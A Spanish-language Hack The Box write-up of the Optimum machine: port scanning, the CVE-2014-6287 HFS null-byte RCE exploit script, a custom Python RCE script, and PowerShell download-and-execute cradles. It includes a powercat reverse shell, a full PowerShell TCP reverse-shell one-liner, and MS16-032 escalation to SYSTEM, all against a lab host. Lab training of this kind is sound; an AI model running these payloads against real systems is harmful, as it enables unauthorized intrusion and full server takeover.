---
layout: single
title: <span style="color:#2a73ea">Opti</span><span style="color:#ef1717">mum </span><span class="en_blanco">-</span><span class="htb"> Hack The Box </span><span class="en_blanco">- </span><span class="es_rojo">E</span><span class="es_amarillo">S</span><span class="es_rojo">P</span>
excerpt: "En este post realizaremos el write up de la máquina Optimum. Tocaremos los conceptos de null byte injection, scripting en python, powershell básica enfocada a pentesting, explotación de las siguientes
vulnerabilidades: para la intrusión CVE-2014-6287 y en la escalada de privilegios CVE-2016-0099 bautizada como MS16-032."
date: 2022-08-28
classes: wide
header:
  teaser: /assets/images/optimum/optimum.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Easy
  - Esp
tags:
  - Null byte injection
  - RCE
  - Python
  - Powershell
  - CVE-2014-6287
  - CVE-2016-0099
  - MS16-032
---

## DESCRIPCION

En este post realizaremos el write up de la máquina Optimum. Tocaremos los conceptos de null byte injection, scripting en python, powershell básica enfocada a pentesting, explotación de las siguientes
vulnerabilidades: para la intrusión CVE-2014-6287 y en la escalada de privilegios CVE-2016-0099 bautizada como MS16-032.

![](/assets/images/optimum/optimum_descripcion.png)

## INDICE

- [Reconocimiento de puertos](#escaneo-de-puertos)
- [Searchexploit](#searchexploit)
- [Remote code execution](#rce)
	- [Ejecución manual](#manual)
	- [Reverse shell](#reverseshell)
- [Escalada de privilegios](#escalada-de-privilegios)
	- [Reconocimiento del sistema](#recon)
	- [Invoke-MS16032.ps1](#invoke)
- [Flags](#flags)
- [Conocimientos obtenidos](#conocimientos-obtenidos)
- [Errores](#errores)
- [Autores y referencias](#autores-y-referencias)


## ESCANEO DE PUERTOS

Escaneamos con `nmap` los puertos abiertos en la máquina Optimum:

```ruby
❯ cat Puertos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Puertos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap --open -p- -T5 -oG Puertos 10.10.10.8
   2   │ Host: 10.10.10.8 () Status: Up
   3   │ Host: 10.10.10.8 () Ports: 80/open/tcp//http/// Ignored State: filtered (65534)
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ Reconocimiento Puertos

{*} Extrayendo puertos...

	La direccion ip es: 10.10.10.8
	Los puertos abiertos son: 80

	Los puertos han sido copiados al portapapeles
```
<br>
Escaneamos al objetivo con los scripts predeterminados de nmap, apuntando a los puertos abiertos en busca de más información.

```ruby
❯ cat Objetivos
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Objetivos
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nmap -sCV -p 80 -oN Objetivos 10.10.10.8
   2   │ Nmap scan report for 10.10.10.8
   3   │ Host is up (0.043s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 80/tcp open  http    HttpFileServer httpd 2.3
   7   │ |_http-server-header: HFS 2.3
   8   │ |_http-title: HFS /
   9   │ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
Por lo que podemos observar tenemos un servidor web, con SO Windows, utilizando un software gratuito el cual sirve para compartir archivos llamado `HttpFileServer` y con la versión `2.3`. Vamos a indagar
un poco en busca de alguna vulnerabilidad.

## SEARCHEXPLOIT
<br>
Podemos utilizar la herramienta `searchexploit` para encontrar vulnerabilidades.

```bash
❯ searchsploit HttpFileServer 2.3
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                  | windows/webapps/49125.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

```

Parece que tenemos un exploit que nos proporciona RCE, su CVE asignado es `CVE-2014-6287`.

## RCE
<br>
Vamos a observar como funciona el exploit.

```python
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
	http = urllib3.PoolManager()
	url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00[{.+exec|{urllib.parse.quote(sys.argv[3])}.}]'
	print(url)
	response = http.request('GET', url)

except Exception as ex:
	print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
	print(ex)%                                                                                                                                                                                             
```
<br>
Viendo el código podemos deducir como se produce el ataque:

- 1 El parámetro search es vulnerable al <a href="http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection" target="_blank" >null byte</a> injection `%00`, 
permitiéndonos saltarse la sanitización del campo `search`.
- 2 Con `urllib.parse.quote` nos encodeamos el payload en formato URL.
- 3 Lanza la petición con `http.request` y se ejecuta el RCE.

<br>
<h3 style="text-align:center" id="manual">EJECUCION MANUAL</h3>
<hr>
<br>

1 - Nos creamos un pequeño script en python que nos url encode nuestro payload.

```python
❯ cat url_encoding.py
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: url_encoding.py
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import urllib3
   2   │ import sys
   3   │ import urllib.parse
   4   │ 
   5   │ 
   6   │ Payload = input("Introduzca el payload deseado: ")
   7   │ Payload_url_encoding = urllib.parse.quote(Payload)
   8   │ print(Payload_url_encoding)
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
<br>
2- Ejecutamos el script y le pasamos el payload `ping /n 1 10.10.16.5`, este comando nos mandará un ping a nuestra máquina demostrando la existencia del RCE.

```bash
❯ python3 url_encoding.py
Introduzca el payload deseado: ping -n 1 10.10.16.5
ping%20-n%201%2010.10.16.5

```
<br>
3- Nos ponemos por escucha en la interfaz que recibirá el ping:

```bash
❯ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

```
<br>
4- Lanzamos la petición con el payload inyectado en la URL:

```bash
curl -s -X GET "10.10.10.8/?search=%00ping%20-n%201%2010.10.16.5" > /dev/null

```
<br>
5- Recibimos la conexión:

```bash
❯ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:47:35.502215 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [S], seq 234439617, win 64240, options [mss 1460,sackOK,TS val 2865589165 ecr 0,nop,wscale 7], length 0
14:47:35.547260 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [S.], seq 1789645455, ack 234439618, win 8192, options [mss 1338,nop,wscale 8,sackOK,TS val 537147 ecr 2865589165], length 0
14:47:35.547292 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2865589210 ecr 537147], length 0
14:47:35.547376 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [P.], seq 1:112, ack 1, win 502, options [nop,nop,TS val 2865589210 ecr 537147], length 111: HTTP: GET /?search=%00ping%20-n%201%2010.10.16.5 HTTP/1.1
14:47:35.641320 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [.], ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 0
14:47:35.651042 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [P.], seq 1:219, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 218: HTTP: HTTP/1.1 200 OK
14:47:35.651064 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 219, win 501, options [nop,nop,TS val 2865589314 ecr 537157], length 0
14:47:35.651985 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [.], seq 219:1545, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 1326: HTTP
14:47:35.651995 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 1545, win 501, options [nop,nop,TS val 2865589315 ecr 537157], length 0
14:47:35.652030 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [P.], seq 1545:1679, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 134: HTTP
14:47:35.652033 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 1679, win 501, options [nop,nop,TS val 2865589315 ecr 537157], length 0
14:47:35.652043 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [.], seq 1679:3005, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 1326: HTTP
14:47:35.652046 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 3005, win 498, options [nop,nop,TS val 2865589315 ecr 537157], length 0
14:47:35.652054 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [P.], seq 3005:3139, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 134: HTTP
14:47:35.652057 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 3139, win 501, options [nop,nop,TS val 2865589315 ecr 537157], length 0
14:47:35.684342 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [P.], seq 3139:4170, ack 112, win 258, options [nop,nop,TS val 537157 ecr 2865589210], length 1031: HTTP
14:47:35.684357 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 4170, win 501, options [nop,nop,TS val 2865589347 ecr 537157], length 0
14:47:35.684602 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [F.], seq 112, ack 4170, win 501, options [nop,nop,TS val 2865589348 ecr 537157], length 0
14:47:35.724418 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [.], ack 113, win 258, options [nop,nop,TS val 537165 ecr 2865589348], length 0
14:47:35.810447 IP 10.10.10.8.http > 10.10.16.5.59738: Flags [F.], seq 4170, ack 113, win 258, options [nop,nop,TS val 537165 ecr 2865589348], length 0
14:47:35.810463 IP 10.10.16.5.59738 > 10.10.10.8.http: Flags [.], ack 4171, win 501, options [nop,nop,TS val 2865589473 ecr 537165], length 0
```
¡Tenemos RCE!
<br>
<h3 style="text-align:center" id="reverseshell">REVERSE SHELL</h3>
<hr>
<br>
Para conseguir la revshell vamos a hacer uso de la herramienta `powercat.ps1` la cual cumple con la misma función que netcat, pero adaptada a powershell, os dejo por aquí su 
<a href="https://github.com/besimorhino/powercat" target="_blank">Github</a> y el enlace a 
<a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters" target="_blank">Hacktricks</a> de donde sacaremos comandos útiles para powershell.

1 - Lo primero que tenemos que hacer es montarnos un servidor para compartirnos la herramienta, en este caso voy a utilizar python.

```bash
❯ ls
 powercat.ps1
❯ python3 -m http.server --bind 10.10.16.5
Serving HTTP on 10.10.16.5 port 8000 (http://10.10.16.5:8000/) ...

```
<br>
2 - Al tener RCE vamos a descargarnos el archivo en la máquina víctima haciendo uso de la powershell y ejecutarlo para obtener la reverse shell:

- La ruta de la powershell que utilizaremos es la siguiente: `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe`.

- Usaremos la siguiente función para descargarnos un archivo en powershell: `IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.5:8000/powercat.ps1')`.

- Para obtener la revshell con powercat utilizamos la siguiente sintaxis: `powercat -c 10.10.16.5 -p 1234 -e cmd`.

- El payload total quedaría tal que así: `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.5:8000/powercat.ps1');powercat -c 10.10.16.5 -p 1234 -e cmd`.

<br>
3 - Modificamos el script para que nos tramite la petición gracias a la librería `requests`:

```python
❯ cat RCE_Optimum.py
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: RCE_Optimum.py
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import urllib3
   2   │ import urllib.parse
   3   │ import requests
   4   │ 
   5   │ Payload = input("Introduzca el payload deseado: ")
   6   │ Payload_url_encoding = urllib.parse.quote(Payload)
   7   │ 
   8   │ 
   9   │ RCE = f"http://10.10.10.8:80/?search=%00[{.+exec|{Payload_url_encoding}.}]" # SUSTITUIR AMBOS [] POR {}
  10   │ 
  11   │ resp = requests.get(RCE)
  12   │ 
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
<br>
4 - Nos ponemos por escucha con `nc` utilizand `rlwrap` para obtener mayor interactividad con la consola:

```bash
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...

```
<br>
5 - Lanzamos el script y le pasamos el payload:

```bash
❯ python3 RCE_Optimum.py
Introduzca el payload deseado: c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.5:8000/powercat.ps1');powercat -c 10.10.16.5 -p 1234 -e cmd

```
<br>
6 - Recibimos la shell:

```bash
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.8] 49327
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

whoami
optimum\kostas

```

## ESCALADA DE PRIVILEGIOS
<br>
<h3 style="text-align:center" id="recon">RECONOCIMENTO DEL SISTEMA</h3>
<hr>

Con el comando `systeminfo` obtenemos la versión del SO:

```sh
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 
System Boot Time:          5/9/2022, 10:37:00 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.438 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.889 MB
Virtual Memory: In Use:    614 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
Podemos ver que la versión del SO es `Windows Server 2012 R2 Standard | 6.3.9600 N/A Build 9600`. Googleando encontramos el siguiente exploit de powershell que nos permite escalar privilegios 
<a href="https://www.exploit-db.com/exploits/39719" target="_blanck">Exploit-DB</a>.

<br>
<h3 style="text-align:center" id="invoke">INVOKE-MS16032.PS1</h3>
<hr>

Después de que el exploit fallara en varias ocasiones encontré un script el cual tiene la función de agregar un comando que se ejecutará como nt authority system.
<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blanck">Invoke-MS16023.ps1</a>.

1 - Nos creamos una reverse shell en powershell y le agregamos los parámetros correspondientes:

```powershell

❯ cat revshell.ps1
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: revshell.ps1
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $client = New-Object System.Net.Sockets.TCPClient("10.10.16.5",2222);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = 
       │ (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::A
       │ SCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```
<br>
2 - En Invoke-MS16023.ps1, agregamos al final del script el comando a utilizar siguiendo esta sintaxis `Invoke-MS16-032 -Command "$cmd"`. Nuestro comando será el siguiente:

```powershell
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.5:8000/revshell.ps1')";

```
<br>
3 - Compartimos los recursos `revshell.ps1 e Invoke-MS16023.ps1` con un servidor de python para que la máquina víctima tenga acceso.

```bash
❯ python3 -m http.server --bind 10.10.16.5
Serving HTTP on 10.10.16.5 port 8000 (http://10.10.16.5:8000/) ...

```

<br>
4 - Nos ponemos por escucha en el puerto correspondiente.

```sh
❯ rlwrap nc -lvnp 2222
listening on [any] 2222 ...

```
<br>
5 - Desde la máquina víctima hacemos una petición de descarga y ejecución de Invoke-MS16023.ps1 el cual lanzará otra petición a revshell.ps1 pero esta vez como nt authority system entablándonos la conexión.

```powershell
C:\Users\kostas\Desktop>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8000/Invoke-MS16032.ps1')"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!

```
<br>
6 - Recibimos la conexión:

```bash
❯ rlwrap nc -lvnp 2222
listening on [any] 2222 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.8] 49168
whoami
nt authority\system
PS C:\Users\kostas\Desktop> 

```
¡Somos nt authority\system!

## FLAGS

<h3>User.txt</h3>

```bash
C:\Users\kostas\Desktop> type user.txt.txt
d0c3xxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
<h3>Root.txt</h3>

```bash
C:\Users\Administrator\Desktop>type root.txt
51edxxxxxxxxxxxxxxxxxxxxxxxxxxxx

```
## CONOCIMIENTOS OBTENIDOS

De la máquina <em>Optimum</em> podemos extraer los siguientes conocimientos:

- Reconocimiento de puertos con `nmap`.
- Búsqueda de vulnerabilidades con `searchexploit`.
- Null byte injection.
- Scripting de automatización en python.
- Uso de `powercat`.
- Powershell básica para pentesting.


## ERRORES

Un posible error que podéis sufrir es el siguiente:

- Si usáis el exploit de <a href="https://www.exploit-db.com/exploits/39719" target="_blanck">Exploit-DB</a> no llegaréis a conseguir la privesc, también es recomendable
asegurarse que arquitectura de powershell estáis utilizando para evitar fallos.


## AUTORES y REFERENCIAS

Autor del write up: Luis Miranda Sierra (Void4m0n) <a href="https://app.hackthebox.com/profile/1104062" target="_blank">HTB</a>. Si queréis contactarme por cualquier motivo lo podéis hacer a través 
de <a href="https://twitter.com/Void4m0n" target="_blank">Twitter</a>.


Autor de la máquina:  <em>ch4p</em>, muchas gracias por la creación de Optimum aportando a la comunidad. <a href="https://app.hackthebox.com/users/1" target="_blank">HTB</a>.
